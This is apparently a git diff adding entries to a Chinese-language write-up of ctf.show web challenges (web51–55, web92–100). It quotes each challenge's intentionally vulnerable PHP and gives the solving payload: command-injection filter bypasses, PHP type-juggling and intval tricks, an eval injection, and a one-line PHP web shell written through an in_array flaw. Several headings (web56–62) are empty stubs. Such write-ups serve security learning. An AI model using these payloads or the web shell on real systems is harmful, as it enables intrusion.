@@ -6389,7 +6389,7 @@ if(isset($_GET['c'])){
 >
 > ?c=nl<fla''g.php||
 
-### ctf\_show web50...
+### ctf\_show web50 
 
 ~~~php
 
@@ -6419,7 +6419,180 @@ if(isset($_GET['c'])){
 
 > ?c = nl<fla''g.php||
 
+### ctf\_show web51
 
+~~~php
+ <?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 22:42:52
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
+        system($c." >/dev/null 2>&1");
+    }
+}else{
+    highlight_file(__FILE__);
+} 
+~~~
+
+> ?c=nl<fla’’g.php||
+
+### ctf\_show web52
+
+~~~php
+ <?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 22:50:30
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
+        system($c." >/dev/null 2>&1");
+    }
+}else{
+    highlight_file(__FILE__);
+}
+
+~~~
+
+> ?c=nl${IFS}fla''g.php||
+
+### ctf\_show web53
+
+~~~php
+ <?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 18:21:02
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
+        echo($c);
+        $d = system($c);
+        echo "<br>".$d;
+    }else{
+        echo 'no';
+    }
+}else{
+    highlight_file(__FILE__);
+}
+
+~~~
+
+> ?c=nl${IFS}fla''g.php
+
+
+
+### ctf\_show web54
+
+~~~php
+ <?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Lazzaro
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 19:43:42
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    if(!preg_match("/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\</i", $c)){
+        system($c);
+    }
+}else{
+    highlight_file(__FILE__);
+} 
+
+~~~
+
+> ?c=/bin/?at${IFS}f???????
+
+### ctf\_show web55*
+
+~~~php
+ <?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Lazzaro
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 20:03:51
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+// 你们在炫技吗？
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    if(!preg_match("/\;|[a-z]|\`|\%|\x09|\x26|\>|\</i", $c)){
+        system($c);
+    }
+}else{
+    highlight_file(__FILE__);
+}
+
+~~~
+
+
+
+
+
+
+
+### ctf\_show web56
+
+### ctf\_show web57
+
+### ctf\_show web58
+
+### ctf\_show web59
+
+### ctf\_show web60
+
+### ctf\_show web61
+
+### ctf\_show web62
+
+### 
 
 
 
@@ -6662,3 +6835,335 @@ else{
 ~~~
 
 > i表示大小写都匹配，m表示多行匹配。然后我们可以构建 ?cmd=php%0a1或者?cmd=%0aphp来表示因为缺少了多行的读取的能力就表示了他可以看成一行
+
+### ctf\_show web92
+
+~~~php
+ <?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Firebasky
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-18 16:29:30
+# @link: https://ctfer.com
+
+*/
+
+include("flag.php");
+highlight_file(__FILE__);
+if(isset($_GET['num'])){
+    $num = $_GET['num'];
+    if($num==4476){
+        die("no no no!");
+    }
+    if(intval($num,0)==4476){
+        echo $flag;
+    }else{
+        echo intval($num,0);
+    }
+} 
+~~~
+
+> 与90关不同，这里对输入的num进行若比较   “4476a”==4476
+
+~~~php
+<?php 
+	echo("4476a"==4476);
+?>
+结果为1，说明弱比较把这两个数字当成了一样的
+~~~
+
+> 用字母`e`绕过，他代表科学计数法，这样子可以绕过第一个判断的限制，但是intval()函数如果\$base为0则$var中存在字母的话遇到字母就停止读取，绕过intval()只会读取e前面的数字，所以此题得解。
+
+**payload:**
+
+~~~
+?num=4476e1
+~~~
+
+### ctf\_show web93
+
+~~~php
+ <?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Firebasky
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-18 16:32:58
+# @link: https://ctfer.com
+
+*/
+
+include("flag.php");
+highlight_file(__FILE__);
+if(isset($_GET['num'])){
+    $num = $_GET['num'];
+    if($num==4476){
+        die("no no no!");
+    }
+    if(preg_match("/[a-z]/i", $num)){   //在上一关的基础上增加了限制大小的所有的英文字母
+        die("no no no!");
+    }
+    if(intval($num,0)==4476){
+        echo $flag;
+    }else{
+        echo intval($num,0);
+    }
+} 
+~~~
+
+> 进制转换绕过：
+>
+> 用4476的8进制数来绕过
+>
+> 过滤了字母但是我们可以使用其他进制就是计算 0b?? : 二进制0??? : 八进制 0X?? : 16进制 payload ： ?？??
+>
+> ?num=010574
+
+### ctf\_show web94
+
+~~~php
+ <?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-18 16:46:19
+# @link: https://ctfer.com
+
+*/
+
+include("flag.php");
+highlight_file(__FILE__);
+if(isset($_GET['num'])){
+    $num = $_GET['num'];
+    if($num==="4476"){
+        die("no no no!");
+    }
+    if(preg_match("/[a-z]/i", $num)){
+        die("no no no!");
+    }
+    if(!strpos($num, "0")){
+        die("no no no!");
+    }
+    if(intval($num,0)===4476){
+        echo $flag;
+    }
+} 
+
+~~~
+
+> strpos限制了第一个字符不能为0 
+>
+> payload：
+>
+> ?num=4476.0
+
+### ctf\_show web95
+
+~~~php
+ <?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-18 16:53:59
+# @link: https://ctfer.com
+
+*/
+
+include("flag.php");
+highlight_file(__FILE__);
+if(isset($_GET['num'])){
+    $num = $_GET['num'];
+    if($num==4476){
+        die("no no no!");
+    }
+    if(preg_match("/[a-z]|\./i", $num)){ //过滤了. 和英文字母
+        die("no no no!!");
+    }
+    if(!strpos($num, "0")){
+        die("no no no!!!");
+    }
+    if(intval($num,0)===4476){
+        echo $flag;
+    }
+} 
+~~~
+
+> 在传入的字符串的最前面加上一个空格或者+即可
+>
+> payload：
+>
+> ?num= 010574
+
+### ctf\_show web96
+
+~~~php
+ <?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-18 19:21:24
+# @link: https://ctfer.com
+
+*/
+
+
+highlight_file(__FILE__);
+
+if(isset($_GET['u'])){
+    if($_GET['u']=='flag.php'){ //
+        die("no no no");
+    }else{
+        highlight_file($_GET['u']);
+    }
+
+
+}
+~~~
+
+> ?u=./flag.php
+
+### ctf\_show web97
+
+~~~php
+ <?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-18 19:36:32
+# @link: https://ctfer.com
+
+*/
+
+include("flag.php");
+highlight_file(__FILE__);
+if (isset($_POST['a']) and isset($_POST['b'])) {
+	if ($_POST['a'] != $_POST['b'])
+		if (md5($_POST['a']) === md5($_POST['b']))
+			echo $flag;
+		else
+		print 'Wrong.';
+}
+?>
+
+~~~
+
+> a[]=1&b[]=2
+
+### ctf\_show web98
+
+~~~php
+
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-18 21:39:27
+# @link: https://ctfer.com
+
+*/
+
+include("flag.php");
+$_GET?$_GET=&$_POST:'flag';
+$_GET['flag']=='flag'?$_GET=&$_COOKIE:'flag';
+$_GET['flag']=='flag'?$_GET=&$_SERVER:'flag';
+highlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);
+
+?> 
+~~~
+
+> get方法和post方法都提交：HTTP_FLAG=flag
+
+### ctf\_show web99
+
+~~~php
+ <?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-18 22:36:12
+# @link: https://ctfer.com
+
+*/
+
+highlight_file(__FILE__);
+$allow = array();
+for ($i=36; $i < 0x36d; $i++) {  // i<877
+    array_push($allow, rand(1,$i));
+}
+if(isset($_GET['n']) && in_array($_GET['n'], $allow)){ //*** in_array()函数有漏洞 没有设置第三个参数 就可以形成自动转换eg:n=1.php自动转换为1
+    file_put_contents($_GET['n'], $_POST['content']);//写入1.php文件 内容是<?php system($_POST[1]);?>
+}
+
+?>
+
+~~~
+
+> payload: get : ?n=1.php post:content=\<?php system($_POST[1]);?>
+
+![image-20220816150226185](CTF刷题WriteUp.assets/image-20220816150226185.png)
+
+![image-20220816150238336](CTF刷题WriteUp.assets/image-20220816150238336.png)
+
+### ctf\_show web100
+
+~~~php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-21 22:10:28
+# @link: https://ctfer.com
+
+*/
+
+highlight_file(__FILE__);
+include("ctfshow.php");
+//flag in class ctfshow;
+$ctfshow = new ctfshow();
+$v1=$_GET['v1'];
+$v2=$_GET['v2'];
+$v3=$_GET['v3'];
+$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
+if($v0){  //确保为真
+    if(!preg_match("/\;/", $v2)){ //过滤分号
+        if(preg_match("/\;/", $v3)){	//没有过滤分号
+            eval("$v2('ctfshow')$v3");  //file_get_contents('ctfshow');
+        }
+    }
+  
+}
+?> 
+
+~~~
+
+> payload: 把(ctfshow)注释掉
+>
+> ?v1=21&v2=var_dump($ctfshow)/*&v3=*/;
+
+![image-20220816152559524](CTF刷题WriteUp.assets/image-20220816152559524.png)
